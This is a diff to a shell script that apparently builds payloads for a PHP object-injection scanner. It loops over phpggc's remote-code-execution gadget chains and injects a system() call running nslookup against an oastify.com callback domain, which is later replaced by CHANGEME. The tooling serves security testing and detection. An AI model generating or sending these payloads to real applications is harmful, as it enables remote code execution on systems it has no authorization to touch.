@@ -4,18 +4,18 @@
 function="system"
 command="nslookup poi-slinger.aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.oastify.com"
 options="-s"
-~/phpggc/phpggc -l | grep RCE | cut -d' ' -f1 | xargs -L 1 ~/phpggc/phpggc -i | grep 'phpggc ' --line-buffered |
+~/phpggc/phpggc -l | /bin/grep RCE | cut -d' ' -f1 | xargs -L 1 ~/phpggc/phpggc -i | /bin/grep 'phpggc ' --line-buffered |
 while read line;  do
    gadget=$(echo $line | cut -d' ' -f2) &&
-   if echo $line | grep -q "<function> <parameter>"; then
+   if echo $line | /bin/grep -q "<function> <parameter>"; then
       echo -e "\n"
       echo $gadget "<function> <parameter>"
       ~/phpggc/phpggc $options $gadget "$function" "$command" | sed 's/poi-slinger.aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.oastify.com/CHANGEME/g' | jq -aR .
-   elif echo $line | grep -q "<code>"; then
+   elif echo $line | /bin/grep -q "<code>"; then
       echo -e "\n"
       echo $gadget "<code>"
       ~/phpggc/phpggc $options $gadget "$function('$command');" | sed 's/poi-slinger.aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.oastify.com/CHANGEME/g' | jq -aR .
-   elif echo $line | grep -q "<command>"; then
+   elif echo $line | /bin/grep -q "<command>"; then
       echo -e "\n"
       echo $gadget "<command>"
       ~/phpggc/phpggc $options $gadget "$command?$(date +%s)" | sed 's/poi-slinger.aaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.oastify.com/CHANGEME/g' | jq -aR .
